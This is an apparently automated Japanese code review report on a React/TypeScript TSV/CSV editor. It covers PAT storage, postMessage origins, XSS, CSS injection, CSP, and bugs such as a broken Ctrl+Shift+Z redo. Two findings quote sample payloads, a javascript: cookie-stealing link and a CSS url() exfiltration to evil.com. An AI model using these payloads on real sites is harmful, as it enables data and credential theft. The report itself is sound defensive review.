# コードレビューレポート 2026-07-06 — shunjapanes/main

## サマリー

- 実行日時: 2026-07-06 16:08 UTC
- プロジェクト: TSV/CSVエディタ (React 19 + TypeScript + Vite + Tailwind)
- レビューファイル数: 9件 (editor.html, App.tsx, bridge.ts, RibbonToolbar.tsx, SearchBar.tsx, FileTabBar.tsx, StatusBar.tsx, sw.js, RibbonButton/Group.tsx)
- 発見件数: 🔴 Critical 1 / 🟠 High 6 / 🟡 Medium 6 / 🟢 Low 4
- うち新規 [NEW]: 8件 / 継続 [継続]: 9件
- 適用済み自動修正: **0件**（自動修正対象なし）
- ⚠️ **Critical指摘が2ヶ月超継続未対応。今回、新規バグ（Ctrl+Shift+Z redo不動作）・CSS injection・CSP欠如タiframeサンドボックス欠如を新規検出。**

---

## セキュリティ所見

### 🔴 Critical

**[継続] S-1: GitHub PAT を btoa() のみで localStorage に保存 — 2ヶ月超未対応**
- 場所: `client/public/editor.html:9057-9061` — `dbmGetPat()` / `dbmSavePat()`
- `btoa` はエンコードであり暗号化ではない。`atob(localStorage.getItem(key))` で即座に PAT を取得可能。XSS → PAT 漏洩 → リポジトリ書き込みの攻撃チェーンが成立。`dbmValidatePat` が `Authorization: Bearer` ヘッダーで PAT を送信しており、`repo` スコープ相当の権限が漏洩。
- **修正案:** Web Crypto API (AES-GCM) で暗号化してから保存。またはセッション限りのメモリ保持に変更し localStorage への永続化を廃止。

---

### 🟠 High

**[継続] S-2: postMessage targetOrigin が `'*'`（親→子・子→親）**
- 場所: `client/src/lib/bridge.ts:3` / `editor.html:9505,9539,9589,9599,9609,9615,9626,9630,9653`
- 送受信とも任意オリジン。クロスオリジン環境では悪意あるページがメッセージを傍受・注入可能。`openContent`（ファイル内容）送信時は機密データも対象になる。
- **修正案:** `postMessage` 第2引数を `window.location.origin` に固定。受信側で `if (e.origin !== window.location.origin) return;` を追加。

**[継続] S-3: `<a href>` の URL に `javascript:` スキームを検証しない（XSS）**
- 場所: `editor.html:7787-7793`（リッチレンダリング `<a href>` 復元）
- `escHtml()` は HTML エンティティをエスケープするが `javascript:` スキームを許可する。セル値に `javascript:alert(document.cookie)` を書き込みリンクをクリックすると XSS が実行される。
- **修正案:** `/^https?:\/\//i.test(url)` でホワイトリスト検証。`rel="noopener noreferrer"` を追加。

**[継続] S-4: ファイル読み込みエンコーディング固定（Shift-JIS/EUC-JP 未対応）**
- 場所: `client/src/App.tsx:113` — `reader.readAsText(file)` （エンコーディング引数なし = UTF-8固定）
- 日本語 Shift-JIS / EUC-JP ファイルで文字化け・データ破損リスク。日本語主対象アプリとして影響が大きい。
- **修正案:** `readAsArrayBuffer` + `TextDecoder` + BOM 検出で自動判定、またはUIでエンコーディング選択を提供。

**[継続] S-5: デバッグ機能 (debugMemo) が本番 UI に露出 — PAT入力UI含む**
- 場所: `client/src/components/RibbonToolbar.tsx` / `editor.html:2040-2062,9529`
- GitHub PAT 入力 UI を含むデバッグ機能が全ユーザーに公開。S-1 と組み合わさり PAT 漏洩の入口になる。ソーシャルエンジニアリングによる悪用リスク。
- **修正案:** `{import.meta.env.DEV && <RibbonGroup label="デバッグ">...</RibbonGroup>}` でガード。

**[NEW] S-6: `<font color>` 値を介した CSS プロパティインジェクション**
- 場所: `editor.html:7793-7794`
- 重要度: **High**
- `escHtml` はセミコロン・コロン・スラッシュを変換しないため、`<font color="red;background-image:url(https://evil.com/?data=)">` が `<span style="color:red;background-image:url(https://evil.com/?data=)">` に変換される。CSS `url()` によるバックグラウンドリクエストでセッション内情報を外部に漏洩させる CSS exfiltration が可能。
- **修正案:** `const safeColor = /^(#[0-9a-fA-F]{3,8}|[a-zA-Z]+|rgb\(\d+,\s*\d+,\s*\d+\))$/.test(color) ? color : 'inherit';`

**[NEW] S-7: iframe に sandbox 属性なし → XSS 時に親フレームをリダイレクト可能**
- 場所: `client/src/App.tsx:141-147`
- `sandbox` 属性がないため iframe 内で `window.parent.location` による強制リダイレクトが可能。editor.html 上で XSS が成立した場合、React App 本体をフィッシングページに誘導できる。
- **修正案:** `sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-downloads allow-modals"` を追加（`allow-top-navigation` は除外）。

---

### 🟡 Medium

**[継続] S-8: App.tsx の postMessage 受信側で `e.origin` を未検証**
- 場所: `client/src/App.tsx:72-93`
- 悪意あるオリジンからのメッセージで `setStatus`・`setTabs` 等の UI 状態が操作される可能性（例: 偽ログイン要求メッセージの表示）。
- **修正案:** ハンドラ冒頭に `if (e.origin !== window.location.origin) return;` を追加。

**[継続] S-9: 置換ボタンが search と replaceOne を連続 postMessage で競合**
- 場所: `client/src/components/SearchBar.tsx:103-108`
- `search` 完了前に `replaceOne` / `replaceAll` が実行され置換対象がずれる。debounce タイマーも未キャンセル。
- **修正案:** `replaceOne/All` に query を同梱した単一メッセージとして送信し、エディタ側でアトミックに処理。

**[NEW] S-10: Content-Security-Policy (CSP) の欠如**
- 場所: `client/public/editor.html:1-10` / `client/index.html:1-16`
- CSP ヘッダー・メタタグが存在しない。S-3（javascript: URL）や S-6（CSS injection）が成功した場合、外部スクリプト読み込み・外部へのデータ送信が無制限に行われる。CSP があればインパクトを大幅に軽減できる。
- **修正案:** `default-src 'self'; script-src 'self'; connect-src 'self' https://api.github.com; object-src 'none';` を設定。

---

## コード品質所見

**[継続] Q-1: console.warn / console.error 6件が本番コードに残存**
- 場所: `editor.html:7891, 7893, 9031, 9048, 9524, 9557`
- 重要度: **Medium**
- ユーザー環境のコンソールに内部状態（列名・オブジェクト構造）が漏洩する。
- **修正案:** Viteの `build.drop: ['console']` オプション適用、またはエラーログは適切なエラーハンドラ（Sentry等）に置換。

**[継続] Q-2: focusEditor() が空の catch で失敗を握りつぶす**
- 場所: `client/src/lib/bridge.ts:7-12`
- 重要度: **Medium**
- 呼び出し元が成否を知る手段がない。
- **修正案:** `if (import.meta.env.DEV) console.warn('[bridge] focusEditor failed:', e)` を追加。

**[NEW] Q-3: message ハンドラの型判別に `else if` が使われていない**
- 場所: `client/src/App.tsx:72-93`
- 重要度: **Low**
- `msg.type` は判別共用体だが全条件を狜立した `if` で評価。マッチ後も全条件を評価し続ける不要な処理が発生する。
- **修正案:** `else if` チェーンまたは `switch` 文に変更する。

---

## バグ・ロジックリスク

**[NEW] B-1: `e.key === 'z' && e.shiftKey` がデッドコード → Ctrl+Shift+Z redo が動作しない**
- 場所: `client/src/App.tsx:65`
- 重要度: **Medium**（ユーザー向け機能の不動作）
- ブラウザは Shift を押しながら Z を押すと `e.key` を `'Z'`（大文字）として報告する。そのため `e.key === 'z' && e.shiftKey` は常に false。結果として Ctrl+Shift+Z による redo が機能しない。
```typescript
// 現状（バグ）
} else if (cmd && ((e.key === 'z' && e.shiftKey) || e.key === 'y' || e.key === 'Y')) {
// 修正後
} else if (cmd && ((e.key === 'Z' && e.shiftKey) || e.key === 'y' || e.key === 'Y')) {
```

**[継続] B-2: `handleKeyDown` 内で `cmd &&` の冗長な二重チェック**
- 場所: `client/src/App.tsx:61-67`
- 重要度: **Low**
- `if (!cmd) return` による早期リターン後も `if (cmd && ...)` と再評価。読み手を混乱させる。
- **修正案:** `cmd &&` 部分を除去してシンプルにする。

**[継続] B-3: FileReader の `onerror` ハンドラが未定義**
- 場所: `client/src/App.tsx:109-115`
- 重要度: **Medium**
- ファイル読み込み失敗時（権限エラー・破損ファイル等）に UI 側で何も通知されない。
- **修正案:** `reader.onerror = () => { setStatus('ファイルの読み込みに失敗しました'); }` を追加。

**[NEW] B-4: Service Worker のキャッシュバージョンが固定 → セキュリティ修正が既存ユーザーに届かない**
- 場所: `client/public/sw.js:1`
- 重要度: **Low**
- `CACHE = 'tsv-editor-v1'` が固定値のため、バージョン名を変更しないかぎり既存ユーザーに旧 `editor.html` が配信され続ける。セキュリティ脂弱性の修正をデプロイしても既存ユーザーには届かないリスク。
- **修正案:** ビルド時に `CACHE` バージョンをコンテンツハッシュで自動インクリメント（例: `tsv-editor-v${BUILD_HASH}`）。

---

## 適用済み自動修正

**なし。** 前回レビューまでに console.log は削除済み。残存する console.warn/error は意図的なエラーハンドラと判断し、ロジック変更を避けるため自動修正対象外とした。

---

## 推奨アクション（優先度順）

1. **🔴 即対応** — **S-1**: PAT の btoa 保存を廃止し、Web Crypto (AES-GCM) またはセッション変数に移行
2. **🟠 早期対応** — **S-2**: `postMessage` の targetOrigin を `'*'` → `window.location.origin` に変更
3. **🟠 早期対応** — **S-3**: `javascript:` URL をホワイトリスト検証（1行修正）
4. **🟠 早期対応** — **S-5**: デバッグUIを `import.meta.env.DEV` ガードで本番ビルドから除外
5. **🟠 早期対応** — **S-6**: `<font color>` の color値をCSSカラー正規表現で検証
6. **🟠 早期対応** — **S-7**: iframe に `sandbox` 属性を追加
7. **🟡 今週中** — **B-1**: `e.key === 'z'` → `e.key === 'Z'` に修正（Ctrl+Shift+Z redo 不動作バグ、1文字修正）
8. **🟡 今週中** — **S-10**: Vite設定にCSPヘッダーを追加
9. **🟡 今週中** — **B-3**: `reader.onerror` ハンドラを追加
10. **🟢 余裕時** — S-4: Shift-JIS/EUC-JP エンコーディング自動判定の実装

> 詳細は `_review/2026-07-06_code_review.md` を参照
